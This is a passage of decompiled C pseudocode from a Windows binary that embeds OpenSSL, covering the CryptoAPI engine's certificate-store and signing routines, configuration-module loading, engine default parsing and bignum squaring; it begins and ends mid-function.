      dword_539190 = v8;
    }
    sub_408310(v8, 114, 101, (int)"engines\\e_capi.c", 1001);
    return 0;
  }
  if ( a2 != 20 )
  {
    v10 = dword_539190;
    if ( !dword_539190 )
    {
      v10 = sub_408040();
      dword_539190 = v10;
    }
    sub_408310(v10, 114, 124, (int)"engines\\e_capi.c", 1006);
    return 0;
  }
  if ( CryptCreateHash(*(_DWORD *)(v6 + 4), 0x8004u, 0, 0, &phHash) )
  {
    if ( CryptSetHashParam(phHash, 2u, pbData, 0) )
    {
      pdwSigLen = 40;
      if ( CryptSignHashW(phHash, *(_DWORD *)(v7 + 12), 0, 0, pbSignature, &pdwSigLen) )
      {
        v14 = (void **)sub_4168C0();
        v15 = (void **)sub_4168C0();
        v16 = v15;
        if ( v14
          && v15
          && sub_43E160(pbSignature, (int)v14, 20)
          && sub_43E160(v22, (int)v16, 20)
          && (v17 = (_DWORD **)sub_41DB20(), (v3 = v17) != 0) )
        {
          sub_41DB90(v17, v14, v16);
        }
        else
        {
          sub_417060(v14);
          sub_417060(v16);
        }
        goto LABEL_25;
      }
      sub_43E0B0(114, 111, (int)"engines\\e_capi.c", 1027);
    }
    else
    {
      sub_43E0B0(114, 102, (int)"engines\\e_capi.c", 1019);
    }
    LastError = GetLastError();
    sub_43E270(LastError);
LABEL_25:
    sub_4139E0(pbSignature, 0x28u);
    CryptDestroyHash(phHash);
    return v3;
  }
  v11 = dword_539190;
  if ( !dword_539190 )
  {
    v11 = sub_408040();
    dword_539190 = v11;
  }
  sub_408310(v11, 114, 99, (int)"engines\\e_capi.c", 1012);
  v12 = GetLastError();
  sub_43E270(v12);
  return 0;
}
// 531674: using guessed type int dword_531674;
// 53167C: using guessed type int dword_53167C;
// 539190: using guessed type int dword_539190;
// 440030: using guessed type char var_18[20];

//----- (00440280) --------------------------------------------------------
int __cdecl sub_440280(int a1, int a2, void *pvFindPara)
{
  const char *v3; // esi
  int v4; // ebx
  HCERTSTORE v5; // ebp
  const CERT_CONTEXT *v7; // esi
  const CERT_CONTEXT *i; // esi

  v3 = *(const char **)(a1 + 20);
  v4 = 0;
  if ( !v3 )
    v3 = "MY";
  sub_43E250((const CHAR *)a1, "Listing certs for store %s\n", v3);
  v5 = sub_43EED0(v3, a1);
  if ( !v5 )
    return 0;
  if ( pvFindPara )
  {
    v7 = sub_43EF50(a1, pvFindPara, v5);
    if ( v7 )
    {
      sub_43ED80(v7, a1, a2);
      CertFreeCertificateContext(v7);
      CertCloseStore(v5, 0);
      return 1;
    }
    else
    {
      CertCloseStore(v5, 0);
      return 0;
    }
  }
  else
  {
    for ( i = CertEnumCertificatesInStore(v5, 0); i; i = CertEnumCertificatesInStore(v5, i) )
    {
      sub_419190(a2, "Certificate %d\n", v4);
      sub_43ED80(i, a1, a2);
      ++v4;
    }
    CertCloseStore(v5, 0);
    return 1;
  }
}

//----- (00440380) --------------------------------------------------------
int __cdecl sub_440380(_DWORD *a1, int a2, int *a3, int *a4, _DWORD *a5)
{
  int *v5; // ebp
  int v6; // eax
  const CHAR *v7; // edi
  const char *v8; // ecx
  HCERTSTORE v9; // eax
  void *v10; // ebx
  PCCERT_CONTEXT v12; // esi
  int v13; // eax
  int v14; // ebx
  HCRYPTPROV *v15; // edi
  int i; // edi
  int v17; // eax
  int v18; // ebx
  int v19; // eax
  int v20; // esi
  _DWORD *v21; // eax
  int v22; // edx
  int v23; // [esp+Ch] [ebp-10h]
  const CHAR *v24; // [esp+10h] [ebp-Ch]
  HCERTSTORE hCertStore; // [esp+14h] [ebp-8h]
  HCERTSTORE hCertStorea; // [esp+14h] [ebp-8h]
  BYTE *pbCertEncoded; // [esp+18h] [ebp-4h] BYREF

  v5 = 0;
  v6 = sub_42A0E0((int)a1, dword_531674);
  v7 = (const CHAR *)v6;
  *a4 = 0;
  *a5 = 0;
  v8 = *(const char **)(v6 + 24);
  v24 = (const CHAR *)v6;
  if ( !v8 )
    v8 = "MY";
  v9 = sub_43EED0(v8, v6);
  v10 = v9;
  hCertStore = v9;
  if ( !v9 )
    return 0;
  v23 = 0;
  v12 = CertEnumCertificatesInStore(v9, 0);
  if ( v12 )
  {
    do
    {
      pbCertEncoded = v12->pbCertEncoded;
      v13 = sub_4334E0(0, (void **)&pbCertEncoded, v12->cbCertEncoded);
      v14 = v13;
      if ( v13 )
      {
        if ( sub_43E760(a3, v13) && sub_44FC10(v14, 1, 0) && (v15 = sub_43F1D0(v12, (int)v24)) != 0 )
        {
          *v15 = (HCRYPTPROV)CertDuplicateCertificateContext(v12);
          sub_433540(v14, dword_531680, (int)v15);
          if ( !v5 )
            v5 = sub_426AF0();
          sub_4269B0(v5, v14);
        }
        else
        {
          sub_433520(v14);
        }
      }
      else
      {
        sub_43E250(v24, "Can't Parse Certificate %d\n", v23);
      }
      ++v23;
      v12 = CertEnumCertificatesInStore(hCertStore, v12);
    }
    while ( v12 );
    v7 = v24;
    v10 = hCertStore;
  }
  CertCloseStore(v10, 0);
  if ( !v5 )
    return 0;
  hCertStorea = (HCERTSTORE)(*((int (__cdecl **)(_DWORD *, int, int *))v7 + 10))(a1, a2, v5);
  for ( i = 0; i < sub_426A30((int)v5); ++i )
  {
    v17 = sub_426A40(v5, i);
    v18 = v17;
    if ( (HCERTSTORE)i == hCertStorea )
    {
      *a4 = v17;
    }
    else
    {
      v19 = sub_433550(v17, dword_531680);
      v20 = v19;
      if ( v19 )
      {
        CryptDestroyKey(*(_DWORD *)(v19 + 8));
        CryptReleaseContext(*(_DWORD *)(v20 + 4), 0);
        if ( *(_DWORD *)v20 )
          CertFreeCertificateContext(*(PCCERT_CONTEXT *)v20);
        sub_413490((void *)v20);
      }
      sub_433520(v18);
    }
  }
  sub_4269F0((void **)v5);
  if ( !*a4 )
    return 0;
  sub_433550(*a4, dword_531680);
  v21 = sub_43F5E0(a1);
  v22 = dword_531680;
  *a5 = v21;
  sub_433540(*a4, v22, 0);
  return 1;
}
// 531674: using guessed type int dword_531674;
// 531680: using guessed type int dword_531680;

//----- (004405D0) --------------------------------------------------------
int __cdecl sub_4405D0(int a1, int a2, int a3, void *Src)
{
  int v4; // eax
  int result; // eax
  int v6; // esi
  void **v7; // eax
  volatile LONG *v8; // ebp
  int v9; // eax
  int v10; // edi
  int v11; // edi
  int v12; // edi
  int v13; // edi
  void *v14; // ebx
  const char *v15; // eax
  int v16; // edi
  int v17; // edi
  int v18; // eax

  if ( dword_531674 == -1 )
  {
    v4 = dword_539190;
    if ( !dword_539190 )
    {
      v4 = sub_408040();
      dword_539190 = v4;
    }
    sub_408310(v4, 100, 106, (int)"engines\\e_capi.c", 299);
    return 0;
  }
  else
  {
    v6 = sub_42A0E0(a1, dword_531674);
    v7 = sub_4DA3E6();
    v8 = (volatile LONG *)sub_4197A0((int)(v7 + 8), 0);
    if ( v8 )
    {
      switch ( a2 )
      {
        case 200:
          v11 = sub_440280(v6, (int)v8, 0);
          sub_404F50(v8);
          result = v11;
          break;
        case 201:
          v12 = sub_440280(v6, (int)v8, Src);
          sub_404F50(v8);
          result = v12;
          break;
        case 202:
          *(_DWORD *)v6 = a3;
          sub_43E250((const CHAR *)v6, "Setting debug level to %d\n", a3);
          sub_404F50(v8);
          result = 1;
          break;
        case 203:
          v15 = (const char *)sub_4247B0((const char *)Src);
          if ( v15 )
          {
            *(_DWORD *)(v6 + 4) = v15;
            sub_43E250((const CHAR *)v6, "Setting debug file to %s\n", v15);
            sub_404F50(v8);
            result = 1;
          }
          else
          {
            sub_43E0B0(100, 65, (int)"engines\\e_capi.c", 359);
            sub_404F50(v8);
            result = 0;
          }
          break;
        case 204:
          *(_DWORD *)(v6 + 8) = a3;
          sub_43E250((const CHAR *)v6, "Setting key type to %d\n", a3);
          sub_404F50(v8);
          result = 1;
          break;
        case 205:
          v10 = sub_43E550((const CHAR *)v6, (int)v8);
          sub_404F50(v8);
          result = v10;
          break;
        case 206:
          v16 = sub_43F580(a3, (const CHAR *)v6);
          sub_404F50(v8);
          result = v16;
          break;
        case 207:
          v17 = sub_43F400((const char *)Src, (const CHAR *)v6, *(_DWORD *)(v6 + 16), 1);
          sub_404F50(v8);
          result = v17;
          break;
        case 208:
          *(_DWORD *)(v6 + 16) = a3;
          sub_404F50(v8);
          result = 1;
          break;
        case 209:
          v13 = sub_43E8F0(v6, (int)v8);
          sub_404F50(v8);
          result = v13;
          break;
        case 210:
          *(_DWORD *)(v6 + 36) = a3;
          sub_404F50(v8);
          result = 1;
          break;
        case 211:
          if ( (unsigned int)(a3 - 1) > 2 )
          {
            sub_43E0B0(100, 114, (int)"engines\\e_capi.c", 379);
            sub_404F50(v8);
            result = 0;
          }
          else
          {
            *(_DWORD *)(v6 + 32) = a3;
            sub_404F50(v8);
            result = 1;
          }
          break;
        case 212:
          v14 = sub_4247B0((const char *)Src);
          if ( v14 )
          {
            sub_413490(*(void **)(v6 + 20));
            *(_DWORD *)(v6 + 20) = v14;
            sub_43E250((const CHAR *)v6, "Setting store name to %s\n", (const char *)Src);
            sub_404F50(v8);
            result = 1;
          }
          else
          {
            sub_43E0B0(100, 65, (int)"engines\\e_capi.c", 332);
            sub_404F50(v8);
            result = 0;
          }
          break;
        case 213:
          if ( (a3 & 1) != 0 )
            *(_DWORD *)(v6 + 28) = *(_DWORD *)(v6 + 28) & 0xFFFCFFFF | 0x20000;
          else
            *(_DWORD *)(v6 + 28) = *(_DWORD *)(v6 + 28) & 0xFFFCFFFF | 0x10000;
          sub_43E250((const CHAR *)v6, "Setting flags to %d\n", a3);
          sub_404F50(v8);
          result = 1;
          break;
        default:
          v18 = dword_539190;
          if ( !dword_539190 )
          {
            v18 = sub_408040();
            dword_539190 = v18;
          }
          sub_408310(v18, 100, 118, (int)"engines\\e_capi.c", 395);
          sub_404F50(v8);
          result = 0;
          break;
      }
    }
    else
    {
      v9 = dword_539190;
      if ( !dword_539190 )
      {
        v9 = sub_408040();
        dword_539190 = v9;
      }
      sub_408310(v9, 100, 128, (int)"engines\\e_capi.c", 305);
      return 0;
    }
  }
  return result;
}
// 531674: using guessed type int dword_531674;
// 539190: using guessed type int dword_539190;

//----- (00440C40) --------------------------------------------------------
int __usercall sub_440C40@<eax>(_DWORD *a1@<esi>)
{
  dword_539194 = sub_461F10("CryptoAPI RSA method", 0);
  if ( dword_539194 )
  {
    dword_539198 = sub_461E50("CryptoAPI DSA method", 0);
    if ( dword_539198
      && sub_42A0F0(a1, (int)off_53166C[0])
      && sub_42A130((int)a1, (int)off_531670)
      && sub_42A1D0((int)a1, 8)
      && sub_42A170((int)a1, (int)sub_4409D0)
      && sub_42A190((int)a1, (int)sub_43E7D0)
      && sub_461FF0((int)a1, (int)sub_43E0F0)
      && sub_4177A0((int)a1, (int)dword_539194)
      && sub_461FD0((int)a1, (int)dword_539198)
      && sub_460C70((int)a1, (int)sub_43FA90)
      && sub_460C90((int)a1, (int)sub_440380)
      && sub_42A1F0((int)a1, (int)&unk_50C3E8)
      && sub_42A1B0((int)a1, (int)sub_4405D0) )
    {
      sub_43E060();
      return 1;
    }
    sub_461F80((void **)dword_539194);
    dword_539194 = 0;
    sub_461EC0((void **)dword_539198);
    dword_539198 = 0;
  }
  return 0;
}
// 4409D0: using guessed type int sub_4409D0();
// 53166C: using guessed type char *off_53166C[2];
// 531670: using guessed type char *off_531670;

//----- (00440DB0) --------------------------------------------------------
volatile LONG *sub_440DB0()
{
  volatile LONG *result; // eax
  volatile LONG *v1; // esi

  result = (volatile LONG *)sub_42A240();
  v1 = result;
  if ( result )
  {
    if ( sub_440C40(result) )
    {
      sub_42B560(v1);
      sub_429F60(v1);
      return (volatile LONG *)sub_408400();
    }
    else
    {
      return (volatile LONG *)sub_429F60(v1);
    }
  }
  return result;
}

//----- (00440DF0) --------------------------------------------------------
void **__cdecl sub_440DF0(void *a1, const char *Src, void *a3, void *a4)
{
  void **result; // eax
  void **v5; // esi
  void *v6; // eax

  if ( dword_5391A0 || (result = (void **)sub_426AF0(), (dword_5391A0 = result) != 0) )
  {
    v5 = (void **)sub_413430(0x18u);
    if ( !v5 )
      return 0;
    *v5 = a1;
    v6 = sub_4247B0(Src);
    v5[1] = v6;
    v5[2] = a3;
    v5[3] = a4;
    if ( !v6 )
    {
      sub_413490(v5);
      return 0;
    }
    if ( !sub_4269B0((int *)dword_5391A0, (int)v5) )
    {
      sub_413490(v5[1]);
      sub_413490(v5);
      return 0;
    }
    return v5;
  }
  return result;
}

//----- (00440EC0) --------------------------------------------------------
int __cdecl sub_440EC0(char *Str)
{
  char *v1; // eax
  unsigned int v2; // eax
  size_t v3; // ebx
  int v4; // esi
  int v5; // edi

  v1 = strrchr(Str, 46);
  if ( v1 )
    v2 = v1 - Str;
  else
    v2 = strlen(Str);
  v3 = v2;
  v4 = 0;
  if ( sub_426A30((int)dword_5391A0) <= 0 )
    return 0;
  while ( 1 )
  {
    v5 = sub_426A40((int *)dword_5391A0, v4);
    if ( !strncmp(*(const char **)(v5 + 4), Str, v3) )
      break;
    if ( ++v4 >= sub_426A30((int)dword_5391A0) )
      return 0;
  }
  return v5;
}

//----- (00440F50) --------------------------------------------------------
int __cdecl sub_440F50(const char *Src, const char *a2, int a3)
{
  _DWORD *v3; // ecx
  _DWORD *v4; // ebx
  int v5; // edi
  int v6; // ebp
  void **v7; // esi
  void *v8; // eax
  int (__cdecl *v9)(void *, int); // eax
  int *v10; // eax
  void (__cdecl *v11)(void *); // ebx

  v4 = v3;
  v5 = 1;
  v6 = 0;
  v7 = (void **)sub_4133F0(0x14u);
  if ( !v7 )
  {
LABEL_11:
    v11 = (void (__cdecl *)(void *))v4[3];
    if ( v11 && v6 )
      v11(v7);
    goto LABEL_14;
  }
  *v7 = v4;
  v7[1] = sub_4247B0(Src);
  v8 = sub_4247B0(a2);
  v7[2] = v8;
  v7[4] = 0;
  if ( v7[1] && v8 )
  {
    v9 = (int (__cdecl *)(void *, int))v4[2];
    if ( !v9 || (v5 = v9(v7, a3), v6 = 1, v5 > 0) )
    {
      v10 = (int *)dword_5391A4;
      if ( dword_5391A4 || (v10 = sub_426AF0(), (dword_5391A4 = v10) != 0) )
      {
        if ( sub_4269B0(v10, (int)v7) )
        {
          ++v4[4];
          return v5;
        }
        sub_408310(14, 115, 65, "crypto\\conf\\conf_mod.c", 323);
      }
      else
      {
        sub_408310(14, 115, 65, "crypto\\conf\\conf_mod.c", 317);
      }
    }
    goto LABEL_11;
  }
LABEL_14:
  if ( v7 )
  {
    sub_413490(v7[1]);
    sub_413490(v7[2]);
    sub_413490(v7);
  }
  return -1;
}
// 440F60: variable 'v3' is possibly undefined
// 408310: using guessed type _DWORD __cdecl sub_408310(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00441080) --------------------------------------------------------
BOOL __cdecl sub_441080(const char *Src, void *a2, void *a3)
{
  return sub_440DF0(0, Src, a2, a3) != 0;
}

//----- (004410A0) --------------------------------------------------------
char *sub_4410A0()
{
  char *v0; // eax
  char *result; // eax
  size_t v2; // edi
  char *v3; // esi
  const char *v4; // eax

  v0 = getenv("OPENSSL_CONF");
  if ( v0 )
    return (char *)sub_4247B0(v0);
  v2 = strlen(sub_462950()) + 13;
  result = (char *)sub_4133F0(v2);
  v3 = result;
  if ( result )
  {
    v4 = sub_462950();
    sub_424880(v3, v4, v2);
    sub_4248C0(v3, "/", v2);
    sub_4248C0(v3, "openssl.cnf", v2);
    return v3;
  }
  return result;
}

//----- (00441130) --------------------------------------------------------
int __cdecl sub_441130(char *Str, int Val, int a3, int (__cdecl *a4)(char *, int, int), int a5)
{
  char *v5; // edi
  int result; // eax
  unsigned __int8 v7; // al
  char *v8; // eax
  char *v9; // ebx
  char *v10; // esi
  int v11; // eax

  v5 = Str;
  if ( Str )
  {
    while ( 1 )
    {
      if ( a3 )
      {
        v7 = *v5;
        if ( *v5 )
        {
          do
          {
            if ( !isspace(v7) )
              break;
            v7 = *++v5;
          }
          while ( v7 );
        }
      }
      v8 = strchr(v5, Val);
      v9 = v8;
      if ( v8 == v5 || !*v5 )
      {
        result = a4(0, 0, a5);
      }
      else
      {
        v10 = v8 ? v8 - 1 : &v5[strlen(v5) - 1];
        if ( a3 && isspace((unsigned __int8)*v10) )
        {
          do
            v11 = (unsigned __int8)*--v10;
          while ( isspace(v11) );
        }
        result = a4(v5, v10 - v5 + 1, a5);
      }
      if ( result <= 0 )
        break;
      if ( !v9 )
        return 1;
      v5 = v9 + 1;
    }
  }
  else
  {
    sub_408310(14, 119, 115, "crypto\\conf\\conf_mod.c", 519);
    return 0;
  }
  return result;
}
// 408310: using guessed type _DWORD __cdecl sub_408310(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00441220) --------------------------------------------------------
void **__cdecl sub_441220(const char *Src, const char *a2)
{
  int v2; // ecx
  char *v3; // edi
  volatile LONG *v4; // eax
  volatile LONG *v5; // esi
  void *v6; // ebx
  void *v7; // eax
  void **result; // eax
  int v9; // [esp+10h] [ebp-4h]

  v9 = 0;
  v3 = sub_462A50(v2, a2, "path");
  if ( !v3 )
  {
    sub_408400();
    v3 = (char *)Src;
  }
  v4 = sub_461170(0, v3, 0, 0);
  v5 = v4;
  if ( v4 )
  {
    v6 = (void *)sub_460D90((int)v4, (int)"OPENSSL_init");
    if ( v6 )
    {
      v7 = (void *)sub_460D90((int)v5, (int)"OPENSSL_finish");
      result = sub_440DF0((void *)v5, Src, v6, v7);
      if ( result )
        return result;
    }
    else
    {
      v9 = 112;
    }
  }
  else
  {
    v9 = 110;
  }
  sub_460CB0(v5);
  sub_408310(14, 117, v9, "crypto\\conf\\conf_mod.c", 220);
  sub_408610(4, "module=", Src, ", path=", v3);
  return 0;
}
// 441245: variable 'v2' is possibly undefined
// 408310: using guessed type _DWORD __cdecl sub_408310(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (004412F0) --------------------------------------------------------
void sub_4412F0()
{
  int v0; // eax
  void **v1; // esi
  void (__cdecl *v2)(void **); // eax

  while ( sub_426A30((int)dword_5391A4) > 0 )
  {
    v0 = sub_4269D0((int *)dword_5391A4);
    v1 = (void **)v0;
    if ( v0 )
    {
      v2 = *(void (__cdecl **)(void **))(*(_DWORD *)v0 + 12);
      if ( v2 )
        v2(v1);
      --*((_DWORD *)*v1 + 4);
      sub_413490(v1[1]);
      sub_413490(v1[2]);
      sub_413490(v1);
    }
  }
  sub_4269F0((void **)dword_5391A4);
  dword_5391A4 = 0;
}

//----- (004413A0) --------------------------------------------------------
int __usercall sub_4413A0@<eax>(const char *a1@<edi>, const char *a2@<esi>, int a3, char a4)
{
  int v5; // ebp
  char *v6; // [esp+0h] [ebp-20h]
  char v7[16]; // [esp+Ch] [ebp-14h] BYREF

  if ( sub_440EC0(v6) || (a4 & 8) == 0 && sub_441220(a2, a1) )
  {
    v5 = sub_440F50(a2, a1, a3);
    if ( v5 <= 0 && (a4 & 4) == 0 )
    {
      sub_408310(14, 118, 109, "crypto\\conf\\conf_mod.c", 173);
      sub_4191B0((int)v7, 13, "%-8d", v5);
      sub_408610(6, "module=", a2, ", value=", a1, ", retcode=", v7);
    }
    return v5;
  }
  else
  {
    if ( (a4 & 4) == 0 )
    {
      sub_408310(14, 118, 113, "crypto\\conf\\conf_mod.c", 162);
      sub_408610(2, "module=", a2);
    }
    return -1;
  }
}
// 4413C0: variable 'v6' is possibly undefined
// 408310: using guessed type _DWORD __cdecl sub_408310(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (004414A0) --------------------------------------------------------
void __cdecl sub_4414A0(int a1)
{
  int i; // edi
  volatile LONG **v2; // eax
  volatile LONG **v3; // esi

  sub_4412F0();
  for ( i = sub_426A30((int)dword_5391A0) - 1; i >= 0; --i )
  {
    v2 = (volatile LONG **)sub_426A40((int *)dword_5391A0, i);
    v3 = v2;
    if ( (int)v2[4] <= 0 && *v2 || a1 )
    {
      sub_426960((int *)dword_5391A0, i);
      sub_460CB0(*v3);
      sub_413490((void *)v3[1]);
      sub_413490(v3);
    }
  }
  if ( !sub_426A30((int)dword_5391A0) )
  {
    sub_4269F0((void **)dword_5391A0);
    dword_5391A0 = 0;
  }
}

//----- (00441560) --------------------------------------------------------
void sub_441560()
{
  sub_4412F0();
  sub_4414A0(1);
}

//----- (00441570) --------------------------------------------------------
int __cdecl sub_441570(int a1, char *VarName, char a3)
{
  int v3; // esi
  char *v4; // eax
  int result; // eax
  int *v6; // ebp
  int v7; // ebx
  int v8; // eax

  v3 = a1;
  if ( !a1 )
    return 1;
  if ( VarName )
  {
    v4 = sub_462A50(a1, 0, VarName);
    if ( v4 )
      goto LABEL_8;
    if ( (a3 & 0x20) == 0 )
    {
LABEL_6:
      sub_408400();
      return 1;
    }
  }
  v4 = sub_462A50(a1, 0, "openssl_conf");
  if ( !v4 )
    goto LABEL_6;
LABEL_8:
  result = sub_4629F0(a1, (int)v4);
  v6 = (int *)result;
  if ( result )
  {
    v7 = 0;
    if ( sub_426A30(result) <= 0 )
    {
      return 1;
    }
    else
    {
      while ( 1 )
      {
        v8 = sub_426A40(v6, v7);
        result = sub_4413A0(*(const char **)(v8 + 8), *(const char **)(v8 + 4), v3, a3);
        if ( result <= 0 && (a3 & 1) == 0 )
          break;
        if ( ++v7 >= sub_426A30((int)v6) )
          return 1;
        v3 = a1;
      }
    }
  }
  return result;
}

//----- (00441630) --------------------------------------------------------
int __cdecl sub_441630(char *a1, char *a2, char a3)
{
  int v3; // ebx
  char *v4; // esi
  int v5; // edi

  v3 = 0;
  v4 = 0;
  v5 = sub_462960(0);
  if ( v5 )
  {
    if ( a1 )
    {
      v4 = a1;
    }
    else
    {
      v4 = sub_4410A0();
      if ( !v4 )
      {
LABEL_12:
        sub_413490(v4);
        goto LABEL_13;
      }
    }
    if ( sub_4629C0(v5) > 0 )
    {
      v3 = sub_441570(v5, a2, a3);
    }
    else if ( (a3 & 0x10) != 0 && (sub_408760() & 0xFFF) == 114 )
    {
      sub_408400();
      v3 = 1;
    }
  }
  if ( !a1 )
    goto LABEL_12;
LABEL_13:
  sub_4629A0(v5);
  return v3;
}

//----- (004416E0) --------------------------------------------------------
BOOL __cdecl sub_4416E0(int *a1, __int16 a2)
{
  return ((a2 & 0x40) == 0 || sub_417D00(a1))
      && ((a2 & 0x80u) == 0 || sub_443F90(a1))
      && ((a2 & 1) == 0 || sub_417760(a1))
      && ((a2 & 2) == 0 || sub_435990(a1))
      && ((a2 & 4) == 0 || sub_455DF0(a1))
      && ((a2 & 0x800) == 0 || sub_457650(a1))
      && ((a2 & 8) == 0 || sub_41A710(a1))
      && ((a2 & 0x200) == 0 || sub_442B70(a1))
      && ((a2 & 0x400) == 0 || sub_442870(a1));
}

//----- (004417B0) --------------------------------------------------------
int __cdecl sub_4417B0(char *Str1, size_t MaxCount, _DWORD *a3)
{
  if ( !Str1 )
    return 0;
  if ( !strncmp(Str1, "ALL", MaxCount) )
  {
    *a3 |= 0xFFFFu;
    return 1;
  }
  else if ( !strncmp(Str1, "RSA", MaxCount) )
  {
    *a3 |= 1u;
    return 1;
  }
  else if ( !strncmp(Str1, "DSA", MaxCount) )
  {
    *a3 |= 2u;
    return 1;
  }
  else if ( !strncmp(Str1, "DH", MaxCount) )
  {
    *a3 |= 4u;
    return 1;
  }
  else if ( !strncmp(Str1, "EC", MaxCount) )
  {
    *a3 |= 0x800u;
    return 1;
  }
  else if ( !strncmp(Str1, "RAND", MaxCount) )
  {
    *a3 |= 8u;
    return 1;
  }
  else if ( !strncmp(Str1, "CIPHERS", MaxCount) )
  {
    *a3 |= 0x40u;
    return 1;
  }
  else if ( !strncmp(Str1, "DIGESTS", MaxCount) )
  {
    *a3 |= 0x80u;
    return 1;
  }
  else if ( !strncmp(Str1, "PKEY", MaxCount) )
  {
    *a3 |= 0x600u;
    return 1;
  }
  else if ( !strncmp(Str1, "PKEY_CRYPTO", MaxCount) )
  {
    *a3 |= 0x200u;
    return 1;
  }
  else if ( !strncmp(Str1, "PKEY_ASN1", MaxCount) )
  {
    *a3 |= 0x400u;
    return 1;
  }
  else
  {
    return 0;
  }
}

//----- (00441950) --------------------------------------------------------
BOOL __cdecl sub_441950(int *a1, char *Str)
{
  int v3; // [esp+4h] [ebp-4h] BYREF

  v3 = 0;
  if ( sub_441130(Str, 44, 1, (int (__cdecl *)(char *, int, int))sub_4417B0, (int)&v3) )
    return sub_4416E0(a1, v3);
  sub_408310(38, 189, 150, (int)"crypto\\engine\\eng_fat.c", 91);
  sub_408610(2, "str=", Str);
  return 0;
}

//----- (004419D0) --------------------------------------------------------
int sub_4419D0()
{
  volatile LONG *i; // esi

  for ( i = (volatile LONG *)sub_42B060(); i; i = (volatile LONG *)sub_42B0D0(i) )
  {
    if ( (i[19] & 8) == 0 )
    {
      sub_417CB0((int *)i);
      sub_443F40((int *)i);
      sub_417730(i);
      sub_435960(i);
      sub_455DC0(i);
      sub_457620(i);
      sub_41A6E0(i);
      sub_442B20((int *)i);
    }
  }
  return 1;
}

//----- (00441A30) --------------------------------------------------------
unsigned int __cdecl sub_441A30(int *a1, unsigned int *a2, int a3, unsigned int *a4)
{
  int v4; // eax
  int v6; // esi
  unsigned int *v7; // edi
  unsigned int *v8; // ebx
  unsigned int v9; // edx
  int v11; // [esp+10h] [ebp-4h]
  int v12; // [esp+18h] [ebp+4h]

  v4 = a3;
  v6 = a3 - 1;
  v7 = a2;
  a1[2 * a3 - 1] = 0;
  v11 = 2 * a3;
  *a1 = 0;
  v8 = (unsigned int *)(a1 + 1);
  if ( a3 - 1 > 0 )
  {
    v7 = a2 + 1;
    v8[v6] = sub_4384B0(a1 + 1, a2 + 1, v6, *a2);
    v4 = a3;
    v8 = (unsigned int *)(a1 + 3);
  }
  if ( v4 - 2 > 0 )
  {
    v12 = a3 - 2;
    do
    {
      v9 = *v7;
      --v12;
      ++v7;
      --v6;
      v8[v6] = sub_4381C0(v8, v7, v6, v9);
      v8 += 2;
    }
    while ( v12 > 0 );
  }
  sub_4387D0(a1, (unsigned int *)a1, (unsigned int *)a1, v11);
  sub_438670(__PAIR64__((unsigned int)a2, (unsigned int)a4), a3);
  return sub_4387D0(a1, (unsigned int *)a1, a4, v11);
}

//----- (00441AF0) --------------------------------------------------------
unsigned int __cdecl sub_441AF0(int *a1, unsigned int *a2, int a3, unsigned int *a4)
{
  int v5; // esi
  unsigned int result; // eax
  int v7; // eax
  unsigned int *v8; // edi
  unsigned int *v9; // edi
  unsigned int v10; // ecx
  unsigned int *v11; // ebp
  unsigned int v12; // eax
  bool v13; // zf
  unsigned int *v14; // [esp-Ch] [ebp-1Ch]
  unsigned int *v15; // [esp+8h] [ebp-8h]
  int v16; // [esp+1Ch] [ebp+Ch]
  unsigned int v17; // [esp+1Ch] [ebp+Ch]
  unsigned int v18; // [esp+1Ch] [ebp+Ch]

  v5 = a3 / 2;
  if ( a3 == 4 )
    return sub_4399C0((int)a1, a2);
  if ( a3 == 8 )
    return sub_439690((int)a1, a2);
  if ( a3 < 16 )
    return sub_441A30(a1, a2, a3, a4);
  v7 = sub_416A90((int)a2, (int)&a2[a3 / 2], a3 / 2);
  v16 = 0;
  if ( v7 <= 0 )
  {
    if ( v7 >= 0 )
      v16 = 1;
    else
      sub_438990(a4, &a2[v5], a2, v5);
    v8 = a4;
  }
  else
  {
    v8 = a4;
    sub_438990(a4, a2, &a2[v5], v5);
  }
  v15 = &v8[2 * a3];
  if ( v16 )
  {
    v9 = &v8[a3];
    memset(v9, 0, 4 * a3);
  }
  else
  {
    v14 = &v8[2 * a3];
    v9 = &v8[a3];
    sub_441AF0(v9, a4, v5, v14);
  }
  sub_441AF0(a1, a2, v5, v15);
  sub_441AF0(&a1[a3], &a2[v5], v5, &a4[2 * a3]);
  v17 = sub_4387D0((int *)a4, (unsigned int *)a1, (unsigned int *)&a1[a3], a3);
  v18 = v17 - sub_438990(v9, a4, v9, a3);
  result = sub_4387D0(&a1[v5], (unsigned int *)&a1[v5], v9, a3);
  v10 = result + v18;
  if ( result + v18 )
  {
    v11 = (unsigned int *)&a1[a3 + v5];
    result = v10 + *v11;
    *v11 = result;
    if ( result < v10 )
    {
      do
      {
        v12 = v11[1];
        ++v11;
        v13 = v12 == -1;
        result = v12 + 1;
        *v11 = result;
      }
      while ( v13 );
    }
  }
  return result;
}

//----- (00441C90) --------------------------------------------------------
int __cdecl sub_441C90(int *a1, int *a2, int *a3)
{
  int v3; // edi
  int *v5; // esi
  unsigned int **v6; // eax
  unsigned int **v7; // ebp
  int v8; // eax
  int v9; // edi
  int v10; // esi
  int v11; // [esp+8h] [ebp-88h]
  unsigned int v12[32]; // [esp+10h] [ebp-80h] BYREF

  v3 = a2[1];
  if ( v3 <= 0 )
  {
    a1[1] = 0;
    a1[3] = 0;
    return 1;
  }
  sub_420700(a3);
  v5 = a1;
  if ( a2 == a1 )
    v5 = sub_420790(a3);
  v6 = (unsigned int **)sub_420790(a3);
  v7 = v6;
  if ( v5 )
  {
    if ( v6 )
    {
      v11 = 2 * v3;
      if ( sub_4173C0((int)v5, 2 * v3) )
      {
        if ( v3 == 4 )
        {
          sub_4399C0(*v5, (unsigned int *)*a2);
LABEL_19:
          v5[3] = 0;
          v9 = *(_DWORD *)(*a2 + 4 * v3 - 4);
          if ( v9 == (unsigned __int16)v9 )
            v5[1] = v11 - 1;
          else
            v5[1] = v11;
          if ( v5 != a1 )
            sub_4173E0(a1, v5);
          v10 = 1;
          goto LABEL_26;
        }
        if ( v3 == 8 )
        {
          sub_439690(*v5, (unsigned int *)*a2);
          goto LABEL_19;
        }
        if ( v3 < 16 )
        {
          sub_441A30((int *)*v5, (unsigned int *)*a2, v3, v12);
          goto LABEL_19;
        }
        v8 = 1 << (sub_416830(v3) - 1);
        if ( v3 == v8 )
        {
